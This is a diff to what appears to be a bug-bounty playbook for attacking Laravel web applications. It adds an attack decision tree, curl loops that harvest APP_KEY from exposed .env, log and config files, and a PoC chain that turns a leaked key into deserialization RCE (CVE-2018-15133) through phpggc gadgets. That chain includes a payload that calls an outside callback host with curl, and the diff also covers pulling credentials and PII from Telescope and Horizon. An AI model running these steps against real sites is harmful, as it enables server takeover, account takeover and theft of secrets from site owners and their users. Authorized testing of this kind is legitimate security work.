@@ -35,7 +35,19 @@ done
 
 # Check error page (trigger 404)
 curl -s "https://$TARGET/definitely-does-not-exist-xyz" | grep -i "laravel\|Whoops\|Ignition\|symfony"
+
+# Version hints: composer artifacts, framework strings, Ignition footer
+curl -s "https://$TARGET/vendor/composer/installed.json" | grep -A2 '"laravel/framework"'
+curl -s "https://$TARGET/" -I | grep -i "x-powered-by"
 ```
+
+**Decision tree (adapts to any Laravel version):**
+1. 404 shows Whoops/Ignition stack trace → `APP_DEBUG=true`. Branch to Phase 2 (Ignition RCE if <8.4.2; otherwise the trace itself leaks env + APP_KEY — High).
+2. `/.env` or any env variant readable → Phase 4. APP_KEY present → go straight for the **decrypt→deserialization RCE** chain, not just cookie forgery.
+3. `/telescope` or `/horizon` reachable (200, not login) → Phase 3 (credential/PII exfil from logs & job payloads).
+4. Signed URLs (`?signature=`) in the app → Phase 5.
+5. Any model-backed create/update endpoint → Phase 6 mass assignment.
+Run every branch that fingerprints positive. Debug mode OFF + Ignition patched does NOT end the hunt — .env exposure, Telescope/Horizon, mass assignment, and signed-URL bugs are version-independent.
 
 ---
 
@@ -107,11 +119,31 @@ curl -s "https://$TARGET/.env.local"
 # If APP_KEY found:
 APP_KEY="base64:XXXXXXX"
 echo "APP_KEY=$APP_KEY"
-# → Can decrypt all Laravel encrypted cookies
-# → Can forge session cookies → ATO for any user
+# → Decrypt ALL Laravel encrypted cookies (laravel_session, XSRF-TOKEN)
+# → Forge session cookies → ATO for any user
+# → CVE-2018-15133: the X-XSRF-TOKEN / session cookie is an encrypted PHP-serialized
+#   blob. With APP_KEY you forge a cookie whose plaintext is a malicious serialized
+#   object → insecure deserialization → RCE (gadget via phpggc). This is the real
+#   crown jewel, not just cookie forgery. Chain: APP_KEY leak → RCE.
 
-# Also check
+# APP_KEY sources beyond /.env (grep all of these):
+for p in /.env /.env.bak /.env.old /.env.save /.env.dev /.env.prod \
+         /config/app.php /storage/logs/laravel.log /vendor/composer/installed.json; do
+  curl -s "https://$TARGET$p" | grep -iE "APP_KEY|base64:" && echo " ^ from $p"
+done
+# Also: APP_KEY frequently leaked in public GitHub repos / Docker images — cross-ref hunt-misc source recon.
+
+# Debug-trace leak (APP_DEBUG=true) also prints APP_KEY in the environment dump of an Ignition page.
 curl -s "https://$TARGET/storage/logs/laravel.log" | tail -100 | grep -i "exception\|error\|key\|password"
+```
+
+**APP_KEY → RCE PoC path (CVE-2018-15133, Laravel <5.6.30 unpatched decrypt; any version if key leaks):**
+```bash
+# 1. phpggc gadget for the installed Laravel major version
+php phpggc Laravel/RCE9 system 'curl http://UNIQUE.COLLAB/laravel-rce' -b -f   # try RCE1..RCE15 per version
+# 2. Encrypt the gadget with the leaked APP_KEY using a forge script (laravel-crypto-killer /
+#    laravel_cookie_forge), set it as the session/X-XSRF-TOKEN cookie, send one request.
+# 3. Confirm via the OOB callback (unique subdomain) — never claim RCE on "no error".
 ```
 
 ---
@@ -183,7 +215,8 @@ php phpggc Laravel/RCE5 system 'id' | base64
 | Debug mode ON | CVE-2021-3129 Ignition RCE | Critical RCE |
 | Telescope accessible | Read API keys, DB queries, env vars | High - credential theft |
 | Horizon accessible | Read failed job payloads | High - PII/token exfil |
-| .env exposed with APP_KEY | Forge session cookie → ATO | Critical ATO |
+| .env exposed with APP_KEY | Decrypt cookies → forge serialized payload → **deserialization RCE** (CVE-2018-15133) | Critical RCE |
+| .env exposed with APP_KEY (no gadget) | Forge session cookie → ATO | Critical ATO |
 | Signed URL bypass | Unauthorized actions (unsubscribe any user, etc.) | Medium-High |
 | Mass assignment | Set is_admin=true → privilege escalation | Critical |
 
@@ -191,10 +224,11 @@ php phpggc Laravel/RCE5 system 'id' | base64
 
 ## Validation
 
-✅ Ignition RCE: `id` command output returned in response
-✅ Telescope: API responses contain DB queries with credentials or user tokens
-✅ APP_KEY: Forged session cookie accepted, returns another user's profile
-✅ Mass assignment: `is_admin: true` accepted, account now has admin privileges
+✅ Ignition RCE: `id`/`whoami` output returned, or OOB callback on a unique subdomain
+✅ APP_KEY → RCE: forged encrypted-cookie deserialization fires an OOB callback (unique subdomain) — status/no-error is NOT proof
+✅ Telescope/Horizon: responses contain real DB queries with credentials or a specific user's token/PII you can tie to an account
+✅ APP_KEY → ATO: forged session cookie accepted, returns a *specific other* user's profile (verifiable artifact)
+✅ Mass assignment: `is_admin: true` accepted AND the account subsequently performs an admin-only action
 
 **Severity:**
 - Ignition RCE: Critical
